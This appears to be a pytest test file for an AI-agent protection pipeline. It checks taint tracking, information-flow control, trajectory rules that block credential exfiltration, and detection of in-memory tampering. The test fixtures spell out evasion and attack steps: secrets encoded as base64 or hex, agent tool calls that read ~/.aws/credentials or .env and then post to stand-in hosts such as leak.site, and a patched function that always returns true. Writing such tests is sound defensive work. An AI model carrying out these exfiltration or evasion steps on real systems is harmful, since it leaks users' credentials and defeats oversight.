from __future__ import annotations

import base64
import urllib.request

import pytest

from panoptis.protect.ifc_lattice import (
    InformationFlowEngine,
    SecurityLabel,
)
from panoptis.protect.integrity import RuntimeIntegrityGuard
from panoptis.protect.ltl_trajectory import LTLTrajectoryVerifier
from panoptis.protect.model import ActionBlocked, ToolAction, Verdict
from panoptis.protect.pipeline import ProtectionConfig, ProtectionPipeline
from panoptis.protect.taint_tracker import DynamicTaintTracker
from panoptis.protect.transactor import SpeculativeTransactor


def test_dynamic_taint_tracker_detects_base64_encoded_secret():
    tracker = DynamicTaintTracker()
    token_val = "sk-proj-SUPER_SECRET_TOKEN_9988776655"  # noqa: S105
    tracker.register_taint("test", token_val, SecurityLabel.SECRET)

    # Encode secret as Base64 (classic taint-evasion bypass)
    b64_secret = base64.b64encode(token_val.encode("utf-8")).decode("utf-8")

    # Tracker must recognize that the base64 string is tainted SECRET!
    label = tracker.evaluate_taint(f"Payload: {b64_secret}")
    assert label == SecurityLabel.SECRET


def test_dynamic_taint_tracker_detects_hex_and_shingle_split_secret():
    tracker = DynamicTaintTracker()
    token_val = "AKIAIOSFODNN7EXAMPLE_SECRET"  # noqa: S105
    tracker.register_taint("test", token_val, SecurityLabel.SECRET)

    # Hex variation
    hex_str = token_val.encode("utf-8").hex()
    assert tracker.evaluate_taint(hex_str) == SecurityLabel.SECRET

    # Interleaved / token-split variation containing shingles
    split_payload = "Data: AKIAIO...SFODNN...7EXAMPLE_SECRET"
    assert tracker.evaluate_taint(split_payload) == SecurityLabel.SECRET


def test_ifc_blocks_base64_transformed_secret_to_public_sink():
    # End-to-end Fides verification: Base64-encoded secret flowing into http_post is blocked!
    tracker = DynamicTaintTracker()
    token_val = "ghp_PersonalAccessTokenSecret123456789"  # noqa: S105
    tracker.register_taint("env", token_val, SecurityLabel.SECRET)

    engine = InformationFlowEngine(taint_tracker=tracker)

    b64_val = base64.b64encode(token_val.encode("utf-8")).decode("utf-8")
    _, findings = engine.audit_tool_call("http_post", {"data": b64_val})

    assert len(findings) > 0
    assert any(f.code == "IFC_ILLEGAL_INFORMATION_FLOW" for f in findings)
    assert any(f.recommends == Verdict.BLOCK for f in findings)


def test_ltl_blocks_multi_hop_exfiltration():
    # Dawn Song et al. trajectory verification: Turn 1 reads credentials, Turn 2 attempts network egress
    ltl = LTLTrajectoryVerifier()
    session_id = "agent_session_101"

    # Turn 1: Agent reads AWS credentials (allowed by itself)
    act1 = ToolAction(
        agent_id="coder",
        session_id=session_id,
        tool="read_file",
        arguments={"path": "~/.aws/credentials"},
    )
    ltl.record_step(act1)

    # Turn 2: Agent attempts to exfiltrate data via public webhook
    act2 = ToolAction(
        agent_id="coder",
        session_id=session_id,
        tool="http_post",
        arguments={"url": "https://external.site/leak"},
    )
    findings = ltl.verify_action(act2)

    assert len(findings) > 0
    assert any(f.code == "LTL_MULTI_HOP_EXFILTRATION_DETECTED" for f in findings)
    assert any(f.recommends == Verdict.BLOCK for f in findings)


def test_ltl_flags_untrusted_input_to_shell_chain():
    ltl = LTLTrajectoryVerifier()
    session_id = "agent_session_202"

    # Turn 1: Agent ingests untrusted text from external web
    act1 = ToolAction(
        agent_id="researcher",
        session_id=session_id,
        tool="fetch_url",
        arguments={"url": "https://untrusted-blog.com/post"},
    )
    ltl.record_step(act1)

    # Turn 2: Agent attempts to execute code derived from session
    act2 = ToolAction(
        agent_id="researcher",
        session_id=session_id,
        tool="execute_shell",
        arguments={"command": "eval 'echo attack'"},
    )
    findings = ltl.verify_action(act2)

    assert len(findings) > 0
    assert any(f.code == "LTL_UNTRUSTED_INPUT_TO_SHELL_CHAIN" for f in findings)
    assert any(f.recommends == Verdict.ESCALATE_HITL for f in findings)


def test_speculative_transactor_intercepts_network_in_fork():
    # Stanford ToolEmu mitigation: Network calls during speculative fork are virtualized
    transactor = SpeculativeTransactor()

    with transactor.capture_side_effects():
        # Execute tool that attempts real network egress
        req = urllib.request.Request(
            "https://api.external-saas.com/v1/terminate",
            data=b'{"instance_id": "i-12345"}',
            headers={"Content-Type": "application/json"},
        )
        resp = urllib.request.urlopen(req)  # noqa: S310
        body = resp.read()

    assert b"speculative_mock_ok" in body
    assert len(transactor.recorded_effects) == 1
    eff = transactor.recorded_effects[0]
    assert eff.target == "https://api.external-saas.com/v1/terminate"
    assert eff.method == "POST"
    assert "i-12345" in str(eff.payload)


def test_runtime_integrity_guard_detects_memory_monkey_patching():
    # Imperial AgenTEE mitigation: Detects in-memory method pointer or bytecode tampering
    guard = RuntimeIntegrityGuard()

    class TargetService:
        def evaluate(self, x: int) -> bool:
            return x > 0

    svc = TargetService()
    guard.seal_function("evaluate", svc, "evaluate")

    # 1. Unmodified service verifies intact
    ok, findings = guard.verify_integrity()
    assert ok
    assert len(findings) == 0

    # 2. Malicious monkey-patching in RAM: bypass evaluate check
    def evil_evaluate(x: int) -> bool:
        return True  # always allow

    svc.evaluate = evil_evaluate  # type: ignore[assignment]

    # Guard must detect that evaluate was tampered with!
    tampered_ok, tampered_findings = guard.verify_integrity()
    assert not tampered_ok
    assert any(f.code == "MEMORY_BYTECODE_TAMPERING_DETECTED" for f in tampered_findings)


def test_pipeline_integration_with_integrity_and_ltl():
    pipeline = ProtectionPipeline(
        config=ProtectionConfig(
            enable_integrity_guard=True,
            enable_ltl_trajectory=True,
            escalate_without_approver=Verdict.ALLOW,
        )
    )

    # 1. Integrity check passes normally
    act = ToolAction(agent_id="coder", session_id="s1", tool="ls", arguments={"dir": "."})
    dec = pipeline.evaluate(act)
    assert dec.allowed

    # 2. Turn 1: Sensitive read
    read_act = ToolAction(
        agent_id="coder", session_id="s1", tool="read_file", arguments={"path": ".env"}
    )
    pipeline.execute(read_act, lambda **kw: "AWS_KEY=123")

    # 3. Turn 2: Attempted multi-hop exfiltration blocked by LTL
    exfil_act = ToolAction(
        agent_id="coder", session_id="s1", tool="http_post", arguments={"url": "https://leak.site"}
    )
    with pytest.raises(ActionBlocked) as exc_info:
        pipeline.execute(exfil_act, lambda **kw: "sent")

    assert exc_info.value.decision.verdict == Verdict.BLOCK
    assert any(
        f.code == "LTL_MULTI_HOP_EXFILTRATION_DETECTED" for f in exc_info.value.decision.findings
    )
